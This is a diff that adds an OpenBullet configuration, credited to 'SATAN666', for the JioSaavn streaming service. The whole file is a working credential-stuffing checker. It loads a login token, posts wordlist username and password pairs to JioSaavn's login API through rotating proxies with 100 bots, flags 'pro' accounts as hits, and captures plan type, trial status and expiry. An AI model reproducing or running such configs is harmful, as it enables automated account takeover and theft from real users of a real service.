@@ -1,0 +1,56 @@
+[SETTINGS]
+{
+  "Name": "JioSaavn",
+  "SuggestedBots": 100,
+  "LastModified": "2019-04-04T21:28:07.8857878+05:30",
+  "AdditionalInfo": "",
+  "Author": "SATAN666",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://www.jiosaavn.com/login.php?action=login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+KEYCHECK 
+  KEYCHAIN Ban OR 
+    KEY "The server encountered an internal error or" 
+PARSE "<COOKIES(CT)>" LR "" "" -> VAR "CT" 
+REQUEST POST "https://www.jiosaavn.com/api.php?__call=user.login&_marker=0" 
+  CONTENT "username=<USER>&password=<PASS>&&ct=<CT>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "Referer: https://www.jiosaavn.com/login.php?action=login" 
+  HEADER "x-requested-with: XMLHttpRequest" 
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Incorrect username/password. Please try again." 
+  KEYCHAIN Success OR 
+    KEY "type='pro'" 
+PARSE "<SOURCE>" LR "type='" "'" -> CAP "Pro/Free" 
+PARSE "<SOURCE>" LR "offer_trial='" "'" -> CAP "Trial" 
+PARSE "<SOURCE>" LR "expiration='" "'" -> CAP "Expiry" 
+FUNCTION UnixTimeToDate "<Expiry>" -> CAP "Expiry" 
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "offer_trial='true'" 
